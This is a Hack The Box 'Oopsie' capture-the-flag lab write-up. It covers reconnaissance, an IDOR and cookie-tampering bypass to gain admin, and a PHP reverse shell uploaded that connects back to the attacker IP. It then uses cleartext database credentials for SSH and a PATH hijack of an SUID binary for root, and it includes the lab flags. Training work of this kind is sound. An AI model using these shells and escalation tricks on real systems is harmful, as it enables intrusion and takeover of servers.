#veryeasy #apache #cookieManipulation #SUID #AuthBypass #fileUpload #IDOR #hijacking #linux #customApplications #webSiteStructureDiscovery #clearTextCredentials 

## 0. **Lab infos**

**Difficulty :** Very easy
**Name :** Oopsie
**IP** : 10.129.153.65
**Objectives :** Get user and root flags
**OS :** Linux

##### **Conclusion**
**Estimated time :** 2h30
**Satisfaction :** 7/10 Because I don't success to have root access.

### 1. **Reconnaissance**

Scan with #nmap

``` bash
┌─[eu-starting-point-2-dhcp]─[10.10.15.56]─[bobinette@htb-eopp8vrjp9]─[~]
└──╼ [★]$ nmap -sV 10.129.153.65
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-13 11:59 CST
Nmap scan report for 10.129.153.65
Host is up (0.084s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The nmap command show us there is a ssh port and a http port open. So is probably a web app.

We enter de ip on firefox :
![[Pasted image 20250113193932.png]]

In the footer we have discovered an email.

``` email
admin@megacorp.com
```


With #burpsuite in Target>Scope we add a scope. after in site map we see this :
![[Pasted image 20250113195235.png]]

A login page at 10.129.153.65/cdn-cgi/login
![[Pasted image 20250113195343.png]]

With #gobuster we also discover an upload page

```Bash
┌─[eu-starting-point-2-dhcp]─[10.10.15.56]─[bobinette@htb-eopp8vrjp9]─[~]
└──╼ [★]$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.129.153.65 -x php,html,txt,conf,bdd
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.153.65
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,conf,bdd
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 10932]
/images               (Status: 301) [Size: 315] [--> http://10.129.153.65/images/]
/themes               (Status: 301) [Size: 315] [--> http://10.129.153.65/themes/]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.153.65/uploads/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.153.65/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.129.153.65/js/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.153.65/fonts/]
```

We are redirect to the same page and after the web app show us an error 403


### 2. **Weaponization**

We create a reverse shell in PHP :

```PHP
<?
php $ip = '10.10.15.56'; // The IP of our attacker machine
$port = 4444; 
$sock = fsockopen($ip, $port); 
exec('/bin/sh -i <&3 >&3 2>&3');
?>
```

### 3. **Delivery**

### 4. **Exploitation**

On the login page we can login as guest so we try it.

There is the url :
``` url
http://10.129.153.65/cdn-cgi/login/admin.php?content=accounts&id=2
```

We try to change the id to 1 and there is.

![[Pasted image 20250113201110.png]]

The access ID of the admin is : `34322`

We see there is cookies and one of theme named `user` have a value of `2233`.

If I change the value with the value that we just found. We are now log as admin and we can access to the uploads page.

![[Pasted image 20250113201457.png]]


### 5. **Installation**

Let's go uploads our reverse shell in php and listen on 4444 port:

```BASH
nc -lvnp 4444
```

![[Pasted image 20250113202133.png]]

The shell.php has correctly been upload.
But when we go on `/uploads/shell.php` we can see this :
![[Pasted image 20250113202440.png]]

The file doesn't work.

It was justan error of syntax :

**Before**
```PHP
<?
php $ip = '10.10.15.56'; // The IP of our attacker machine
$port = 4444; 
$sock = fsockopen($ip, $port); 
exec('/bin/sh -i <&3 >&3 2>&3');
?>
```

**After**
```PHP
<?php
$ip = '10.10.15.56'; // The IP of our attacker machine
$port = 4444; 
$sock = fsockopen($ip, $port); 
exec('/bin/sh -i <&3 >&3 2>&3');
?>
```

And after that it's work but the connecter is directly closed so we modified the script for maintain the session :

```PHP
<?php
set_time_limit(0);
ignore_user_abort(true);

$ip = '10.10.15.56';  
$port = 4444;         

$sock = fsockopen($ip, $port);

if (!$sock) {
    die('Impossible to connect to the attacker');
}

while (true) {

    $cmd = fgets($sock, 1024); 
   
    if (feof($sock)) {
        break;
    }

    $output = shell_exec($cmd); 
    fwrite($sock, $output);
}

fclose($sock);
?>
```


### 6. **Command and Control**

And it's working :
![[Pasted image 20250113204635.png]]

We are connected with `www-data` in `/var/www/html/uploads`.
### 7. **Actions on Objectives**

In `/home` we discover an user named `robert` and in his file there's a file name `user.txt` and in this file there is :

**`f2c74ee8db7983851ab2a96a44eb7981`**

There is our user flag.

We discover a file name `db.php` in `/var/www/html/cdn-cgi/login/` that contain :
```PHP
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

We probably have the login of robert. This could be :

`robert:M3g4C0rpUs3r!`

Remember, at [[#1. **Reconnaissance**]] we see an SSH port open, so go try to connect with the login of robert.

```bash
ssh robert@10.129.153.65
robert@10.129.153.65's password: M3g4C0rpUs3r!
```

And it's totally work.
Now we want to have the root access.

With the help of ChatGPT I found that the bin file bugtracker execute root command so we make an injection :

```BASH
/usr/bin/bugtracker ; cat /etc/passwd
```

Output :

```BASH
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
robert:x:1000:1000:robert:/home/robert:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
```

It's work so let's go explore the `/root` path.

```Bash
robert@oopsie:/$ /usr/bin/bugtracker ; ls /root/

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: s
---------------

cat: /root/reports/s: No such file or directory

ls: cannot open directory '/root/': Permission denied
```

Flop...

I don't know how this work but it's work :

```BASH
robert@oopsie:/tmp$ echo '/bin/sh' > cat
robert@oopsie:/tmp$ cat cat
/bin/sh
robert@oopsie:/tmp$ chmod +x cat
robert@oopsie:/tmp$ export PATH=/tmp:$PATH
robert@oopsie:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
robert@oopsie:/tmp$ bugtracher
bugtracher: command not found
robert@oopsie:/tmp$ bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 3
---------------

# ^C
# ls
cat
systemd-private-739d7b271ff04b51b34731122d8e4c1d-apache2.service-hlthi1
systemd-private-739d7b271ff04b51b34731122d8e4c1d-systemd-resolved.service-fvsSCI
systemd-private-739d7b271ff04b51b34731122d8e4c1d-systemd-timesyncd.service-5B6jzQ
vmware-root_557-4282236562
# cd /root
# ls
reports  root.txt
# cat root.txt
# less root.txt
/bin/bash: q:: command not found
!done  (press RETURN)

```

I think we have create a file names `cat` contains `/bin/sh` and we include `/tmp` in the `PATH` variable for forced the execution.

Less root.txt open vim and show us the flag :

`af13b0bee69f8a877c3faf667f7beacf`